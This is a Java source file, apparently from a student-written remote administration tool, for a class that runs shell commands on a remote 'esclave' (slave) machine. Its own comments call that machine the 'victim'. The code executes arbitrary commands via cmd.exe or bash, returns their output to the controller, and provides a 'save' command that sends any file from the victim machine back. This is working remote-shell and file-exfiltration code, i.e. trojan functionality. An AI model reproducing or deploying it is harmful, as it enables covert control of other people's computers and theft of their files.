package remote.action;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;

import send.specific.object.SendSpecificObject;
import send.specific.object.sendInputStream;
import client.Esclave;
import constante.Constante;

/**
 * 		Classe qui se charge d'envoyer une commande au systeme d'exploitation a travers le terminal de type console de l'esclave.
 * 		Implemente des fonctions qui recupere les flux de sorties et les flux d'erreurs des 
 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
 *
 */

public class Terminal
{
	// Parametres :
	// =====================================================================
	private String				m_cheminExecution;
	private File				m_dossierExecution;

	private String				executeur	= (System.getProperty("os.name")
															.contains("win") || System				// Optenir le shell Linuxien ou Windows
															.getProperty("os.name").contains(
																	"Win")) ? "cmd.exe"
															: "/usr/bin/bash";
	private sendInputStream	m_fluxErreur, m_fluxSortie;									// Flux d'entree et de sortie des commnandes
	private String				option		= (System.getProperty("os.name")
															.contains("win") || System				// Propriete du shell Windows
															.getProperty("os.name").contains(
																	"Win")) ? "/C" : "-c";

	
	
	// Constructeur :
	// =====================================================================

	public Terminal()
	{
		m_cheminExecution = Paths.get("").toAbsolutePath().toString();
		m_dossierExecution = new File(m_cheminExecution);
	}

	// Accesseurs :
	// =====================================================================

	/**
	 * Fonction qui retourne le dossier dans lequel la commmande va s'executer
	 * @return le dossier dans lequel s'execute le fichier
	 */
	public String getDirectory()
	{
		return m_dossierExecution.getAbsolutePath();
	}

	// Methodes :
	// =====================================================================

	/**
	 * 1. Recupere une chaine de caractère correspondant a la commande souhaité.
	 * 2. Recupere le chemin courant du contexte dans lequel la commande a été effectué
	 * 3. Gere les remontées et descentes dans l'arborescence avec la commande cd
	 * 4. Implemente une fonction save qui permet de recuperer un fichier sur la machine victime
	 * 5. Lance un ProcessBuilder pour la commande, lance deux thread qui recupere les Input de sortie 
	 * @param commande : intitulé de la commande
	 * @param esclave: : l'esclave depuis lequel est executé la commande
	 * @return String correspondant au flux de sortie et aux flux d'erreurs combinés
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public String nouvellecommande(String commande, Esclave esclave)
			throws IOException, InterruptedException
	{
		String res = null;
		commande = commande.trim();
		String[] commandeList = commande.split("\\s+");

		if (commandeList[0].equals("cd"))
		{ // Si c'est une commande cd
			if (commandeList.length > 1)
			{ 																					// Si elle est bien ecrite

				File newDirectory = new File(m_cheminExecution, commandeList[1]);

				if (newDirectory.exists() && newDirectory.isDirectory() 		// Si le
																								// fichier
																								// existe
																								// est
																								// un
																								// repertoire
																								// et
																								// pas
																								// ..
						&& !commandeList[1].contains(".."))
				{
					m_cheminExecution += File.separator + commandeList[1];
					m_dossierExecution.deleteOnExit();
					m_dossierExecution = new File(m_cheminExecution);
					//	System.out.println(chemin);
					return Constante.code_message_cmd;								// Retourne un code pour indiquer que je me suis bien deplace dans l'arborescence
				}

				else if (commandeList[1].contains(".."))
				{ 																				// Sinon si on veut
																								// revenir en
																								// arriere
					String[] split = commandeList[1].split("\\/");
					int nbre_retour_en_arriere = split.length;

					split = m_cheminExecution.split("\\\\");
					int niveau = split.length;
					while (niveau > 1 && nbre_retour_en_arriere > 0)
					{
						niveau--;
						nbre_retour_en_arriere--;
					}
					m_cheminExecution = "";
					for (int i = 0; i < niveau; i++)
					{
						m_cheminExecution += split[i] + File.separator;
					}
					m_dossierExecution.deleteOnExit();
					m_dossierExecution = new File(m_cheminExecution);
					return Constante.code_message_cmd;
				}

				else
				{ 																								// Si ce n'est pas un dossier
					String str = commandeList[1] + " n'est pas un dossier";
					m_fluxErreur = new sendInputStream(new ByteArrayInputStream(
							str.getBytes()));
					new Thread(m_fluxErreur).start();

				}
			}

		}
		else if (commandeList[0].equals("save"))
		{  																										// Sinon si on veut
																											// enregistrer un
																											// fichier
			if (commandeList.length == 1
					|| (commandeList.length == 2 && commandeList[1].equals("-h")))
			{
				String str = "man: save permet d'envoyer de recuperer un fichier sur l'ordinateur\n"
						+ "Usage: save [fichier]";
				m_fluxErreur = new sendInputStream(new ByteArrayInputStream(
						str.getBytes()));
				new Thread(m_fluxErreur).start();
			}
			else if (commande.length() > 1)
			{
				File sendFile = new File(m_cheminExecution, commandeList[1]);
				if (sendFile.exists() && !sendFile.isDirectory())
				{
					SendSpecificObject.sendTxt(sendFile.getName(),
							sendFile.getPath(), esclave.getOut());
				}
				else
				{
					return sendFile.getName()
							+ " ne peut pas être envoyer ou n'existe pas";
				}

			}
		}
		else
		{

			ProcessBuilder pb = new ProcessBuilder(executeur, option, commande);
			pb.directory(m_dossierExecution);

			Process p = pb.start();
			m_fluxSortie = new sendInputStream(p.getInputStream());
			m_fluxErreur = new sendInputStream(p.getErrorStream());
			new Thread(m_fluxSortie).start();
			new Thread(m_fluxErreur).start();
			p.waitFor();
			p.destroy();
		}
		if (m_fluxErreur == null && m_fluxSortie == null)
			return Constante.code_message_cmd;
		res = ((m_fluxSortie == null) ? null : m_fluxSortie.getFinale()) + "\n"
				+ ((m_fluxErreur == null) ? null : m_fluxErreur.getFinale());
		return (res == null) ? Constante.code_message_cmd : res;
	}

}